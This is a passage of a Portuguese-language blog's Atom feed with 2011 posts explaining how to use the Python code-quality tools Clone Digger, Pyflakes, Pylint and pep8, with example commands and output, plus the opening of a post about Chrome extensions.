detalhado (&lt;a href="http://clonedigger.sourceforge.net/examples/nltk_first_50.html" title="Exemplo de relatório do Clone Digger"&gt;como este&lt;/a&gt;). Serão apresentadas informações como a
quantidade de arquivos analisados, quantidade de “clones”, de linhas
duplicadas e um apontamento com os trechos de código que a ferramenta
concluiu como “clones” (não necessariamente iguais, mas semelhantes).&lt;/p&gt;
&lt;p&gt;Particularmente, a ferramenta me ajuda bastante a determinar se certos
trechos de código não poderiam ser herdados por uma classe pai, ou
algumas rotinas costumeiras não poderiam ser encapsuladas em funções.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://clonedigger.sourceforge.net/index.html" title="Página oficial do projeto Clone Digger"&gt;&lt;em&gt;Clone Digger: Discovers duplicate code in Python and Java&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.andrewsmedina.com/2011/01/31/analise-de-codigo-em-python/" title="Excelente post do Andrews Medina sobre ferramentas de análise de código em Python"&gt;&lt;em&gt;Andrews Medina:&lt;/em&gt; Análise de código em &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="qualidade"></category><category term="clone-digger"></category></entry><entry><title>Assegure a qualidade do seu código Python - Pyflakes</title><link href="https://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html" rel="alternate"></link><published>2011-10-02T17:58:00-03:00</published><updated>2011-10-02T17:58:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-10-02:/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html</id><summary type="html">&lt;p&gt;Depois da dar uma pincelada na &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegura a qualidade do seu código Python com a pep8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt; e no &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Assegure a qualidade do seu código Python com o Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt;, chegou a hora de
falarmos um pouco sobre o &lt;strong&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Resumidamente, o &lt;a href="https://launchpad.net/pyflakes" title="Pyflakes no Launchpad"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt; é uma ferramenta de qualidade que
analisa o seu código &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; atrás de erros (de sintaxe e
importação, por exemplo), retornando um relatório muito objetivo com o …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Depois da dar uma pincelada na &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegura a qualidade do seu código Python com a pep8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt; e no &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Assegure a qualidade do seu código Python com o Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt;, chegou a hora de
falarmos um pouco sobre o &lt;strong&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Resumidamente, o &lt;a href="https://launchpad.net/pyflakes" title="Pyflakes no Launchpad"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt; é uma ferramenta de qualidade que
analisa o seu código &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; atrás de erros (de sintaxe e
importação, por exemplo), retornando um relatório muito objetivo com o
arquivo, linha e o tipo de incoerência que ele encontrou.&lt;/p&gt;
&lt;p&gt;Uma excelente ferramenta para você ter “plugada” ao seu editor favorito.&lt;/p&gt;
&lt;h2&gt;O que o Pyflakes faz que o Pylint não faz?&lt;/h2&gt;
&lt;p&gt;As comparações, acredito, serão inevitáveis. Afinal, o que o &lt;em&gt;Pyflakes&lt;/em&gt;
faz que o &lt;em&gt;Pylint&lt;/em&gt; não faz? A resposta que você encontrará é muito
simples: O &lt;strong&gt;&lt;em&gt;Pyflakes&lt;/em&gt; não analisa a “beleza”&lt;/strong&gt; do seu &lt;strong&gt;código&lt;/strong&gt;. Ou
seja, ele apenas &lt;strong&gt;verifica erros de lógica e de sintaxe&lt;/strong&gt;, não de
convenções de código.&lt;/p&gt;
&lt;p&gt;Isso faz do &lt;em&gt;Pyflakes&lt;/em&gt; o parceiro ideal do seu editor de código
favorito. Por ser objetivo, favorece a análise e traz resultados
interessantes, por exemplo, apontando variáveis criadas que nunca foram
usadas, ou métodos importados que nunca foram chamados no escopo de um
módulo &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Logo, ter as duas ferramentas à mão é uma excelente pedida para
incrementar ainda mais o seu ambiente de desenvolvimento.&lt;/p&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;Vamos analisar o código de um projeto da faculdade que eu fiz, chamado
&lt;a href="https://bitbucket.org/kplaube/social-portal-for-soccer-players/overview" title="Visite o repositório do projeto no BitBucket"&gt;&lt;em&gt;Social portal for soccer players&lt;/em&gt;&lt;/a&gt; (encontra-se aberto no
&lt;em&gt;BitBucket&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyflakes apps/notificate/views.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A resposta é muito clara. Existem classes sendo importadas, mas que não
estão sendo usadas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apps/notificate/views.py:3: &lt;span class="s1"&gt;&amp;#39;EmptyPage&amp;#39;&lt;/span&gt; imported but unused
apps/notificate/views.py:3: &lt;span class="s1"&gt;&amp;#39;InvalidPage&amp;#39;&lt;/span&gt; imported but unused
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O funcionamento básico do &lt;em&gt;Pyflakes&lt;/em&gt; é esse… simples como as melhores
coisas devem ser!&lt;/p&gt;
&lt;h2&gt;Pyflakes + Vim&lt;/h2&gt;
&lt;p&gt;Se assim como eu, você tem um “tropeço” pelo &lt;a href="http://www.vim.org/" title="Página oficial do Vi Improved"&gt;&lt;em&gt;vim&lt;/em&gt;&lt;/a&gt;, você não pode
deixar passar esse bom &lt;em&gt;plugin&lt;/em&gt; chamado &lt;a href="http://symbolsystem.com/pyflakes-vim/" title="pyflakes.vim - Verifique o seu código em tempo real"&gt;&lt;em&gt;pyflakes.vim&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para instalá-lo, basta seguir o guia de instalação contido no arquivo
&lt;strong&gt;README&lt;/strong&gt; (&lt;a href="https://github.com/kevinw/pyflakes-vim#readme" title="README do pyflakes.vim no GitHub"&gt;leia diretamente do &lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt;). Para que o &lt;em&gt;plugin&lt;/em&gt;
funcione corretamente, o seu &lt;em&gt;vim&lt;/em&gt; deve ter suporte a &lt;em&gt;Python&lt;/em&gt; (se não
tiver, basta compilá-lo com o parâmetro &lt;strong&gt;-–enable-pythoninterp&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;Uma vez instalado, quando estiver editando um código &lt;em&gt;Python&lt;/em&gt;, basta
utilizar o comando &lt;strong&gt;:cc&lt;/strong&gt; para navegar entre os erros encontrados pelo
&lt;em&gt;plugin&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://launchpad.net/pyflakes" title="Faça download agora mesmo do Pyflakes"&gt;&lt;em&gt;Pyflakes in Launchpad&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://symbolsystem.com/pyflakes-vim/" title="Utilize o Pyflakes em seu VIM"&gt;&lt;em&gt;pyflakes.vim: check Python code on the fly&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="pyflakes"></category><category term="qualidade"></category></entry><entry><title>Assegure a qualidade do seu código Python - Pylint</title><link href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" rel="alternate"></link><published>2011-09-06T17:48:00-03:00</published><updated>2011-09-06T17:48:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-09-06:/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html</id><summary type="html">&lt;p&gt;Se você precisa de uma ferramenta mais poderosa que o &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegure a qualidade do seu código Python – pep8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;, talvez você
precise do &lt;em&gt;Pylint&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;De forma (bem) resumida, o &lt;em&gt;Pylint&lt;/em&gt; analisa de forma minuciosa o código
do seu projeto &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, lhe retornando uma variedade de relatórios
(as vezes, detalhistas até demais) sobre todo o tipo de problema que …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Se você precisa de uma ferramenta mais poderosa que o &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegure a qualidade do seu código Python – pep8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;, talvez você
precise do &lt;em&gt;Pylint&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;De forma (bem) resumida, o &lt;em&gt;Pylint&lt;/em&gt; analisa de forma minuciosa o código
do seu projeto &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, lhe retornando uma variedade de relatórios
(as vezes, detalhistas até demais) sobre todo o tipo de problema que ele
encontra. Indo de incoerências com a &lt;em&gt;PEP 8&lt;/em&gt;, até nome de variáveis.&lt;/p&gt;
&lt;p&gt;É sem dúvida, uma das melhores ferramentas feitas para o &lt;em&gt;Python&lt;/em&gt;, e é
essencial para você deixar o seu código mais próximo do “estado da
arte”.&lt;/p&gt;
&lt;p&gt;Mas o que eu achei mais legal sobre o &lt;em&gt;Pylint&lt;/em&gt;, foi um comentário em sua
documentação. O &lt;a href="http://www.logilab.org/card/pylint_manual#what-is-pylint" title="O que é o pylint?"&gt;autor salienta&lt;/a&gt; muito bem que a ferramenta pode ser
eficiente em certos contextos, mas não em todos. Então, antes de
“pularmos de cabeça”, peço que você utilize o bom senso e saiba mensurar
as suas necessidades em relação ao que a ferramenta tem a oferecer.&lt;/p&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;Vamos testar as conformidades do arquivo &lt;code&gt;site.py&lt;/code&gt; segundo o &lt;em&gt;Pylint&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pylint /usr/lib/python2.7/dist-packages/site.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O resultado pode parecer assustador. Então “vamos começar pelo começo”.&lt;/p&gt;
&lt;p&gt;O resultado do &lt;em&gt;Pylint&lt;/em&gt; é dividido em duas grandes seções: &lt;strong&gt;análise de
código&lt;/strong&gt; e &lt;strong&gt;relatório&lt;/strong&gt;; O primeiro, como o nome sugere, apresenta uma
análise de código bem semelhante a apresentada pelo &lt;em&gt;pep8&lt;/em&gt;. Porém no
seguinte formato:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;MESSAGE_TYPE: LINE_NUM:[OBJECT:] MESSAGE
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos pegar a primeira linha gerada pelo &lt;em&gt;Pylint&lt;/em&gt; para entender melhor:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;C:  1: Missing docstring
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;C&lt;/strong&gt; é o tipo da mensagem, &lt;strong&gt;1&lt;/strong&gt; é o número da linha (no arquivo) onde
o problema foi constatado, &lt;strong&gt;Missing docstring&lt;/strong&gt; é a mensagem gerada. O
&lt;em&gt;Pylint&lt;/em&gt; poderá apresentar os seguintes tipos de mensagens:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[R]efactor for a &amp;quot;good practice&amp;quot; metric violation
[C]onvention for coding standard violation
[W]arning for stylistic problems, or minor programming issues
[E]rror for important programming issues (i.e. most probably bug)
[F]atal for errors which prevented further processing
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Quase posso ver o brilho em seus olhos. A saída do &lt;em&gt;Pylint&lt;/em&gt; deixou de
ser enigmática, não?!&lt;/p&gt;
&lt;p&gt;A segunda seção, a de relatório, apresentará alguns números
interessantes sobre o seu projeto. Como o número de &lt;em&gt;warnings&lt;/em&gt; e
&lt;em&gt;errors&lt;/em&gt;, uma nota para o seu projeto (e um comparativo com a execução
anterior do &lt;em&gt;Pylint&lt;/em&gt;), quantidade de código duplicado, quantidade de
código documentado e “desenhará” uma árvore de dependências do seu
projeto.&lt;/p&gt;
&lt;h2&gt;Diminuindo o ruído&lt;/h2&gt;
&lt;p&gt;Eu avisei que o &lt;em&gt;Pylint&lt;/em&gt; era “barulhento”!&lt;/p&gt;
&lt;p&gt;Vamos reduzir um pouco o nível de detalhes da ferramenta, passando
alguns parâmetros:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pylint /usr/lib/python2.7/dist-packages/site.py --reports&lt;span class="o"&gt;=&lt;/span&gt;n --include-ids&lt;span class="o"&gt;=&lt;/span&gt;y --disable&lt;span class="o"&gt;=&lt;/span&gt;W0232
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Primeiro, com o parâmetro &lt;strong&gt;–-reports=n&lt;/strong&gt; dizemos que não queremos
aquele relatório gigantesco no final da análise. O &lt;strong&gt;–-include-ids=y&lt;/strong&gt;
exibe para gente os &lt;em&gt;ids&lt;/em&gt; das mensagens de erros do &lt;em&gt;Pylint&lt;/em&gt;. É útil,
pois todas as mensagens que você julgar desnecessárias para a análise
você adiciona no parâmetro &lt;strong&gt;-–disable&lt;/strong&gt; (separadas por vírgula).&lt;/p&gt;
&lt;p&gt;Para que não seja necessário passar todos esses parâmetros todas as
vezes que executar o &lt;em&gt;Pylint&lt;/em&gt; basta gerar um arquivo &lt;strong&gt;.pylintrc&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pylint --reports&lt;span class="o"&gt;=&lt;/span&gt;n --include-ids&lt;span class="o"&gt;=&lt;/span&gt;y --disable&lt;span class="o"&gt;=&lt;/span&gt;W0232 --generate-rcfile &amp;gt; ~/.pylintrc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É possível gerar este arquivo por projeto, podendo mudar a
especificidade das métricas de acordo com a necessidade. Quer saber
mais? &lt;a href="http://www.logilab.org/card/pylint_tutorial" title="Pylint tutorial"&gt;Leia este tutorial muito bom&lt;/a&gt;, direto da documentação do
&lt;em&gt;Pylint&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para entender os códigos das mensagens, &lt;a href="http://pylint-messages.wikidot.com/all-codes" title="Todos os códigos retornados pelo Pylint"&gt;confira a listagem nesta &lt;em&gt;wiki&lt;/em&gt;&lt;/a&gt;,
ou utilize o parâmetro &lt;strong&gt;-–help-msg&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pylint --help-msg&lt;span class="o"&gt;=&lt;/span&gt;R0904:

R0904: &lt;span class="se"&gt;\*&lt;/span&gt;Too many public methods &lt;span class="o"&gt;(&lt;/span&gt;%s/%s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="se"&gt;\*&lt;/span&gt;
Used when class has too many public methods, try to reduce this to get a more
simple &lt;span class="o"&gt;(&lt;/span&gt;and so easier to use&lt;span class="o"&gt;)&lt;/span&gt; class. This message belongs to the design checker.
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.logilab.org/857" title="Obtenha o Pylint gratuitamente"&gt;&lt;em&gt;Pylint: analyzes Python source code looking for bugs and signs of poor quality&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.logilab.org/card/pylint_manual" title="Leia o manual oficial do Pylint"&gt;&lt;em&gt;Logilab.org: Pylint User Manual&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.logilab.org/card/pylint_tutorial" title="Leia agora mesmo este excelente tutorial sobre Pylint"&gt;&lt;em&gt;Logilab.org: Pylint Tutorial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://turbogears.org/1.0/docs/UsingPylint.html" title="Leia as recomendações de uso do Pylint com TurboGears"&gt;&lt;em&gt;TurboGears Documentation: Using Pylint to improve the quality of your code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="pylint"></category><category term="qualidade"></category></entry><entry><title>Assegure a qualidade do seu código Python - pep8</title><link href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" rel="alternate"></link><published>2011-08-26T13:51:00-03:00</published><updated>2011-08-26T13:51:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-08-26:/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html</id><summary type="html">&lt;p&gt;Convenções de código! Já tive a oportunidade de &lt;a href="http://www.profissionaisti.com.br/2009/06/codifique-como-um-verdadeiro-pythonista/" title="Codifique como um verdadeiro Pythonista"&gt;escrever sobre elas no &lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;. Benção ou
maldição? Há quem goste, há quem ache uma perda de tempo…&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Acredito muito que a organização e a qualidade do código são benéficas
para qualquer projeto, principalmente para aqueles que possuem alta
rotatividade de …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Convenções de código! Já tive a oportunidade de &lt;a href="http://www.profissionaisti.com.br/2009/06/codifique-como-um-verdadeiro-pythonista/" title="Codifique como um verdadeiro Pythonista"&gt;escrever sobre elas no &lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;. Benção ou
maldição? Há quem goste, há quem ache uma perda de tempo…&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Acredito muito que a organização e a qualidade do código são benéficas
para qualquer projeto, principalmente para aqueles que possuem alta
rotatividade de profissionais. Padrões de projetos, padrões estruturais
e de escrita facilitam a “assimilação” do que já foi produzido, facilita
a manutenção e “orienta” as novas produções.&lt;/p&gt;
&lt;p&gt;Se você tem problemas em decorar convenções e boas práticas, não
desanime! O &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; possui algumas ferramentas “bacanudas” que vão
te auxiliar a deixar o &lt;em&gt;software&lt;/em&gt; mais próximo do “estado da arte”, seja
garantindo as convenções de código, seja avaliando a qualidade do mesmo.&lt;/p&gt;
&lt;h2&gt;Python Enhancement Proposals&lt;/h2&gt;
&lt;p&gt;As “PEPs“ (&lt;em&gt;Python Enhancement Proposal&lt;/em&gt;) são documentos que geralmente
abordam alguma nova funcionalidade da linguagem, propósitos,
procedimentos ou ambiente. Em suma, são “guidelines” que te orientam num
melhor uso da linguagem e suas funcionalidades, bem como podem ajudar em
questões como arquitetura, ambiente ou processos de sua aplicação.&lt;/p&gt;
&lt;p&gt;Para saber mais sobre &lt;em&gt;PEPs&lt;/em&gt;, acesse a &lt;a href="http://www.python.org/dev/peps/pep-0001/" title="PEP1 - PEP Purpose and Guidelines"&gt;&lt;em&gt;PEP 1&lt;/em&gt;&lt;/a&gt; que é justamente um documento
explicando o que são e o que fazem as &lt;em&gt;Python Enhancement Proposals&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;pep8&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;pep8&lt;/em&gt; é uma ferramenta simples (e muito eficaz) que analisa o seu
código &lt;em&gt;Python&lt;/em&gt; segundo as convenções de código descritas na
&lt;a href="http://www.python.org/dev/peps/pep-0008/" title="PEP 8 - Style Guide for Python Code"&gt;&lt;em&gt;PEP 8&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Vamos analisar o código do &lt;a href="https://github.com/djangobrasil/djangobrasil.org" title="Repositório no GitHub do site do Django no Brasil"&gt;&lt;em&gt;Django Brasil&lt;/em&gt;&lt;/a&gt; (você não sabia? O site é
&lt;em&gt;open source&lt;/em&gt;!), mais especificamente o arquivo &lt;strong&gt;models.py&lt;/strong&gt; da &lt;em&gt;app&lt;/em&gt;
&lt;strong&gt;blog&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pep8 src/djangobrasil/apps/blog/models.py

src/djangobrasil/apps/blog/models.py:42:65: W291 trailing whitespace
src/djangobrasil/apps/blog/models.py:62:1: E302 expected &lt;span class="m"&gt;2&lt;/span&gt; blank lines, found &lt;span class="m"&gt;1&lt;/span&gt;
src/djangobrasil/apps/blog/models.py:105:80: E501 line too long &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;89&lt;/span&gt; characters&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como podemos ver, a ferramenta nos mostra a linha e coluna onde o
problema foi encontrado, apresentando uma breve descrição da incoerência
que estamos cometendo em relação às recomendações da
&lt;em&gt;PEP 8&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para obter uma resposta mais “verbose“, podemos passar alguns parâmetros
para o &lt;code&gt;pep8&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pep8 src/djangobrasil/apps/blog/models.py --show-source --show-pep8
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Viu só?! Dessa forma podemos aprender sobre a &lt;em&gt;PEP 8&lt;/em&gt; enquanto “ferimos” as
convenções de código em nossos projetos :D&lt;/p&gt;
&lt;p&gt;Para finalizar, podemos contar as ocorrências de problemas com a
&lt;em&gt;PEP 8&lt;/em&gt; em determinada região do projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pep8 src/djangobrasil/apps/blog/ --statistics -qq --filename&lt;span class="o"&gt;=&lt;/span&gt;*.py

&lt;span class="m"&gt;1&lt;/span&gt;       E225 missing whitespace around operator
&lt;span class="m"&gt;7&lt;/span&gt;       E302 expected &lt;span class="m"&gt;2&lt;/span&gt; blank lines, found &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;1&lt;/span&gt;       E303 too many blank lines &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;11&lt;/span&gt;      E501 line too long &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;89&lt;/span&gt; characters&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;4&lt;/span&gt;       W291 trailing whitespace
&lt;span class="m"&gt;2&lt;/span&gt;       W391 blank line at end of file
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nenhum problema muito grave de convenções de código na &lt;em&gt;app blog&lt;/em&gt; do
&lt;em&gt;DjangoBrasil&lt;/em&gt; ;)&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://github.com/jcrocholl/pep8/" title="Repositório no GitHub do pep8"&gt;&lt;em&gt;pep8 – Python style guide checker&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.python.org/dev/peps/" title="Conheça os tipos de PEPs e quais os seus propósitos"&gt;&lt;em&gt;Python.org – Index of Python Enhancement Proposals (PEPs)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.python.org/dev/peps/pep-0001/" title="Saiba o que é, o que faz, e como é feita uma PEP"&gt;&lt;em&gt;Python.org – PEP 1: Purpose and Guidelines&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.python.org/dev/peps/pep-0008/" title="Conheça as convenções de código Python"&gt;&lt;em&gt;Python.org – PEP 8: Style Guide for Python Code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.vivaolinux.com.br/artigo/PEP-8-Guia-de-estilo-para-codigo-Python" title="Artigo do Viva o Linux que é uma adaptação para o Português da PEP 8"&gt;&lt;em&gt;Viva o Linux&lt;/em&gt; – &lt;em&gt;PEP 8&lt;/em&gt;: Guia de estilo para código &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jcrocholl/pep8/" title="Repositório no GitHub do projeto pep8"&gt;&lt;em&gt;GitHub – pep8&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Nos próximos &lt;em&gt;posts&lt;/em&gt;, vamos dar uma pincelada no &lt;em&gt;pylint&lt;/em&gt;, &lt;em&gt;pyflakes&lt;/em&gt; e
&lt;em&gt;clone digger&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="qualidade"></category><category term="pep8"></category></entry><entry><title>Minhas extensões favoritas do Google Chrome</title><link href="https://klauslaube.com.br/2011/08/09/minhas-extensoes-favoritas-google-chrome.html" rel="alternate"></link><published>2011-08-09T23:17:00-03:00</published><updated>2011-08-09T23:17:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-08-09:/2011/08/09/minhas-extensoes-favoritas-google-chrome.html</id><summary type="html">&lt;p&gt;O &lt;a href="http://www.google.com/chrome?hl=pt-BR" title="Um navegador novo e mais rápido"&gt;&lt;em&gt;Google Chrome&lt;/em&gt;&lt;/a&gt; há muito já provou ser um fantástico navegador, me
fazendo largar o &lt;a href="http://br.mozdev.org/" title="Navegue com segurança e eficiência"&gt;&lt;em&gt;Firefox&lt;/em&gt;&lt;/a&gt; já na sua primeira semana de lançamento
(olha que eu ainda usava &lt;em&gt;Windows&lt;/em&gt;).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Hoje é um dos navegadores mais rápidos, seguros, com uma usabilidade
impressionante e que suporta mais recursos da &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; (obrigado &lt;em&gt;Webkit …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;O &lt;a href="http://www.google.com/chrome?hl=pt-BR" title="Um navegador novo e mais rápido"&gt;&lt;em&gt;Google Chrome&lt;/em&gt;&lt;/a&gt; há muito já provou ser um fantástico navegador, me
fazendo largar o &lt;a href="http://br.mozdev.org/" title="Navegue com segurança e eficiência"&gt;&lt;em&gt;Firefox&lt;/em&gt;&lt;/a&gt; já na sua primeira semana de lançamento
(olha que eu ainda usava &lt;em&gt;Windows&lt;/em&gt;).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Hoje é um dos navegadores mais rápidos, seguros, com uma usabilidade
impressionante e que suporta mais recursos da &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; (obrigado &lt;em&gt;Webkit&lt;/em&gt; ;)).
Portanto, motivos para usá-lo não faltam (mesmo depois do lançamento do &lt;em&gt;Firefox 5&lt;/em&gt;).&lt;/p&gt;
